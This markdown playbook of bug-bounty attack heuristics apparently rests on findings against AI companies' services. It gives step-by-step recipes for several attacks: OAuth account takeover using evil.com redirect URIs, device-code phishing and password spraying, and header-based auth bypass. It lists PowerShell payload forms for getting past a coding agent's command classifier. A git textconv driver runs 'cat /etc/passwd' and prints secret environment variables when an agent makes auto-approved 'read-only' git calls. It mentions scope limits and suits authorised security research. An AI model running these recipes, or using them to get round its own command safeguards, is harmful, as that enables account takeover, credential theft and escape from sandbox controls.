# Operator Brain — Decision Rules from Real Findings

The operator brain is a set of heuristics derived from the 18 real findings in SESSION-STATUS.md.
Each rule is grounded in a specific discovery, not theory.

---

## Core Decision Rules

### Rule 01 — Staging Subdomain → Azure AD Tenant Leak
**Source:** F-08 (staging.openai.com)
**Trigger:** Any staging.*, dev.*, beta.*, test.* subdomain found
**Action:**
1. GET https://login.microsoftonline.com/{staging-domain}/v2.0/.well-known/openid-configuration
2. If tenant_id appears in issuer → tenant identified
3. Extract: token_endpoint, authorization_endpoint, grant_types_supported
4. Check grant_types_supported for "password" → ROPC enabled
5. Check for "urn:ietf:params:oauth:grant-type:device_code" → device code enabled
6. If ROPC enabled → attempt user enumeration via login errors
7. If device code enabled → generate phishing URL
**Escalation:** P4 staging sub → P2 tenant leak → P1 password spray chain

### Rule 02 — Unauthenticated OAuth Registration → ATO
**Source:** HF-01 (HuggingFace /oauth/register)
**Trigger:** OAuth /register, /clients, /applications endpoint returns 200 without auth
**Action:**
1. Send minimal RFC 7591 registration request:
   ```json
   {"client_name": "test", "redirect_uris": ["https://evil.com/callback"],
    "grant_types": ["authorization_code"], "response_types": ["code"]}
   ```
2. If 201 returned with client_id + client_secret → confirmed unauth registration
3. Register additional clients with varying redirect_uris
4. Generate authorization URL: /oauth/authorize?client_id={evil_id}&redirect_uri=https://evil.com/callback&response_type=code
5. Confirm the authorization URL is accepted (does not reject evil.com)
6. Document: victim clicks link → code delivered to evil.com → attacker redeems for tokens
7. Test device code flow: POST /oauth/token with grant_type=urn:ietf:params:oauth:grant-type:device_code
**Escalation:** Unauthenticated endpoint → full account takeover of any user

### Rule 03 — PowerShell Parser Input → Enumerate ALL AST Block Types
**Source:** CODEX-01/02/03
**Trigger:** Any system accepts PowerShell code input for execution or analysis
**Action — test every PowerShell AST block in sequence:**
1. `begin {} process { <payload> } end {}` — begin block execution
2. `trap { <payload> }; throw "x"` — trap handler execution
3. `clean { <payload> }` — clean block (pwsh 7.3+, executes even on termination)
4. `filter f { <payload> }; f` — filter function
5. `using namespace System; [Console]::WriteLine("x")` — namespace import
6. `class C { static [void] M() { <payload> } }; [C]::M()` — class method
7. `workflow w { <payload> }; w` — workflow block (PS 5.x)
8. `configuration c { <payload> }; c` — DSC configuration
9. `#requires -Version 5; <payload>` — requires directive
10. `param([string]$x = "<payload>"); $x` — default parameter value
**Key insight:** If one AST block is blocked, the classifier has a list. Test all variants.
Blocked begin{} but allowed trap{}? → CODEX-02 pattern.
**Escalation:** Classifier bypass → arbitrary command execution in sandboxed environment

### Rule 04 — Git Safelist → Test Config-Driven Drivers
**Source:** CODEX-04 (git config textconv/external-diff)
**Trigger:** System auto-approves "read-only" git commands (git log, git diff, git show)
**Action:**
1. Check if system has a safelist that permits certain git subcommands
2. Create .git/config or ~/.gitconfig with textconv driver:
   ```ini
   [diff "spy"]
       textconv = /bin/sh -c 'id; cat /etc/passwd; echo $SECRET_ENV'
   ```
3. Create .gitattributes: `*.txt diff=spy`
4. Run `git diff HEAD` or `git log -p` — triggers textconv for any .txt file in diff
5. Test external-diff: `[diff] external = /path/to/script`
6. Test merge driver: `[merge "spy"] driver = /path/to/script %O %A %B`
7. Test filter driver: `[filter "spy"] clean = /path/to/script`
**Key insight:** Git config drivers execute at the OS level, not checked by CLI safety flags.
A system that blocks `git checkout` but allows `git diff` is still exploitable via textconv.

### Rule 05 — Device ID Header → Backend Auth Bypass
**Source:** F-01 (OAI-Device-Id)
**Trigger:** Any non-standard device or session header seen in traffic
**Action:**
1. Capture valid request with all headers
2. Strip Authorization header, keep device header
3. Send to backend-api.* or internal.* endpoint
4. Check: does the request succeed without auth?
5. Try variations: X-Device-Id, CF-Device-Id, X-Client-Id, X-Session-Id
6. Test: does the device ID header work on different accounts?
**Escalation:** Header-based auth bypass → access any account's backend without their token

### Rule 06 — Bootstrap Endpoint → Infrastructure Leak
**Source:** F-02
**Trigger:** Any /bootstrap, /init, /config endpoint found
**Action:**
1. GET /bootstrap with no auth
2. Check response for: serviceAccountToken, kubeconfig, cluster URLs, internal IPs
3. Check for: database connection strings, API keys, feature flags
4. F-02 pattern: response contained Kubernetes pod IPs and service account data
**Escalation:** Infrastructure leak → lateral movement to internal services

### Rule 07 — Cookie Value Anomaly → RFC1918 Disclosure
**Source:** F-05
**Trigger:** Cookie value is long encoded string or base64 that doesn't decode to obvious session data
**Action:**
1. Base64 decode cookie value
2. JSON parse if applicable
3. Look for: IP patterns (10.x.x.x, 172.16-31.x.x, 192.168.x.x)
4. Look for: hostnames, service names, port numbers
5. F-05 pattern: routing cookie contained pod IP in 10.x.x.x range
**Escalation:** RFC1918 disclosure → SSRF targeting, service topology mapping

### Rule 08 — CORS ACAC=true → Requires Credential-Bearing Endpoint
**Source:** AN-01 (Anthropic staging), HF-02 (HuggingFace)
**Trigger:** Response has Access-Control-Allow-Origin: [your-origin] + Access-Control-Allow-Credentials: true
**Action:**
1. Confirm ACAC=true with a specific origin (not wildcard — wildcard + ACAC is blocked by browsers)
2. Identify what data the endpoint returns (is it sensitive?)
3. Write PoC HTML that fetches the endpoint with credentials: 'include'
4. Test from attacker-controlled page
5. Chain with CSRF to trigger state-changing requests cross-origin
**Note:** CORS ACAC alone is P3-P4 unless the endpoint returns sensitive data → P2

### Rule 09 — Feature Flag Endpoint → Enumerate All Flags
**Source:** F-06
**Trigger:** /config, /feature-flags, /experiments, /account/config endpoint found unauthenticated
**Action:**
1. GET endpoint without any auth headers
2. Record full response — all flag names and values are intelligence
3. Look for: beta features, internal tools, disabled features (can they be force-enabled?)
4. Cross-reference flag names against codename list for shadow API discovery
5. F-06 pattern: 37 feature flags returned including internal tooling flags

### Rule 10 — WebSocket Endpoint → Unauthenticated Upgrade
**Source:** F-07 (Realtime WS)
**Trigger:** Any wss:// endpoint discovered in JS or via codename fuzzing
**Action:**
1. Attempt WebSocket upgrade without session cookie or Authorization header
2. `python -c "import websocket; ws = websocket.WebSocket(); ws.connect('wss://TARGET/ws')"`
3. If connection established → attempt to send messages
4. Test: does the server send data before receiving any message?
5. Test: does the server accept commands that should require auth?
**Escalation:** Unauthenticated WS → real-time data access, command injection

---

## Escalation Path Matrix

| Initial Signal | Immediate Action | Potential Severity |
|---|---|---|
| staging.* subdomain | Azure AD openid-config | P1 via ROPC chain |
| /oauth/register 200 | Unauthenticated client registration | P1 ATO |
| JWT with RS256 | HS256 confusion test | P2 auth bypass |
| PowerShell input | AST block enumeration | P2 classifier bypass |
| Git auto-approve | Config driver test | P2 RCE |
| CORS ACAC=true | Identify sensitive endpoint | P2-P3 |
| /config unauthenticated | Full response analysis | P3-P4 |
| Device header in traffic | Strip auth, keep header | P3 auth bypass |
| Routing cookie encoded | Decode for RFC1918 | P3 info disclosure |
| Bootstrap endpoint | Check for k8s data | P3 infra leak |
| WS endpoint found | Unauthenticated upgrade | P4-P2 |

---

## Dead-End Detection

Stop pursuing a vector when:

1. **Rate limiting with lockout risk** — three 429 responses in 60 seconds → stop, log, move on
2. **WAF blocking** — 403s with WAF fingerprint in response → don't attempt bypass without explicit scope permission
3. **Out of scope** — endpoint is on a domain not listed in the program scope page → document and skip
4. **Requires MFA** — and no MFA bypass vector is apparent → skip unless bypass is the specific target
5. **Duplicate indicator** — search platform for existing reports on same vulnerability class + endpoint → if similar report exists, skip
6. **No user-controlled input** — endpoint takes no user input → not exploitable, move to next
7. **Local-only sink** — payload only executes in your own browser/session → self-XSS, not reportable

---

## Information Gain Optimization

Prioritize actions that produce the most new intelligence per request made:

**High information gain (do first):**
- /.well-known/openid-configuration (one request → OAuth full config)
- /openapi.json or /swagger.json (one request → full API schema)
- GraphQL introspection query (one request → full schema)
- crt.sh query (one request → all historical subdomains)
- Source map file (one request → full source code structure)

**Medium information gain:**
- httpx on subdomain list (N requests → live hosts with tech stack)
- nuclei scan (N requests → known CVEs and misconfigs)

**Low information gain (do last):**
- Directory brute force (thousands of requests → few findings typically)
- Parameter brute force (thousands of requests → situational)
- Content discovery on already-mapped paths

---

## Tool Selection Shortcuts

| Task | Best Tool | Fallback |
|---|---|---|
| Subdomain enum | subfinder (fastest) | amass + assetfinder |
| Live host check | httpx | httprobe |
| Port scan | naabu | nmap (slower) |
| URL history | gau | waybackurls |
| XSS automation | dalfox | xsstrike |
| Parameter discovery | arjun | paramspider |
| Content discovery | ffuf (fastest) | dirsearch |
| Vuln scan | nuclei | manual |
| GraphQL | InQL (Burp) | clairvoyance |
| JS analysis | source-map extraction script | linkfinder |
| OAuth test | manual + curl | postman |
| WebSocket test | wscat | websocat |
| Race condition | python threading.Barrier | turbo intruder |

---

## Session State Machine

The operator tracks session state across phases:

```
INIT
  │
  ▼
PASSIVE_RECON ──────────► findings.passive[]
  │
  ▼
AUTH_SURFACE ───────────► findings.auth[]
  │
  ▼
AI_SPECIFIC ────────────► findings.ai[]
  │
  ▼
INFRA_SWEEP ────────────► findings.infra[]
  │
  ▼
RACE_TEST ──────────────► findings.race[]
  │
  ▼
DOCUMENTATION ──────────► reports[]
  │
  ▼
SUBMISSION
  │
  ▼
FOLLOW_UP (7-day intervals)
```

At each phase transition: write all findings to SQLite DB before proceeding.
Never lose state to session termination.

---

## Cognitive Biases to Avoid

**Anchoring:** Don't fixate on the first vulnerability class found. A P3 CORS finding should not
consume the rest of the session. Log it, move to the next phase.

**Confirmation bias:** If you expect SSRF, don't only test SSRF. Run the full phase checklist.

**Recency:** The last finding you made is not the most important. Score all findings by severity
before deciding what to report first.

**Sunk cost:** If a vector has been unproductive for 45 minutes, move on. Document the dead end.

**Scope creep:** Only test in-scope assets. An interesting subdomain out of scope = wasted time.
